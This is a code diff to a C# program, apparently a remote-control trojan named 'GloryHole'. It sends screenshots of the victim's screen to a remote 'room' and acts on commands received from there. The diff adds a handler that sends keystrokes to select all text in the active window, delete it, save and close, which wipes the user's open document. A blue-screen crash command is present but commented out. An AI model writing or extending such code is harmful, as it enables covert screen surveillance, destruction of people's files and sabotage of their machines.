@@ -26,6 +26,12 @@ namespace GloryHole
         [DllImport("ntdll.dll")]
         private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);
 
+        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("USER32.DLL")]
+        public static extern bool SetForegroundWindow(IntPtr hWnd);
+
 
         static async Task Main(string[] args)
         {
@@ -39,9 +45,10 @@ namespace GloryHole
                         await room.sendScreen(getScreenShot());
                         foreach (Command cmd in room.commands)
                         {
-                            switch (cmd.type)
+                            switch ((CommandTypes)cmd.type)
                             {
                                 case (CommandTypes.AntiVanya): /*Ели косанда анти ваня */
+                                    helloVania();
                                     break;
                                 case (CommandTypes.Cursor): /*Ели курсор поменять нада */
                                     break;
@@ -50,7 +57,8 @@ namespace GloryHole
                                 case (CommandTypes.WriteText):/*Ели текс нада написать */
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
-                                    BSOD();
+                                    //BSOD();
+                                    
                                     break;
                             }
                         }
@@ -66,9 +74,12 @@ namespace GloryHole
         }
 
 
-        public static void PressKeyToKill(object comand)
+        public static void helloVania()
         {
-
+            System.Windows.Forms.SendKeys.SendWait("^{a}");
+            System.Windows.Forms.SendKeys.SendWait("{DEL}");
+            System.Windows.Forms.SendKeys.SendWait("^{s}");
+            System.Windows.Forms.SendKeys.SendWait("%{F4}");
         }
 
 
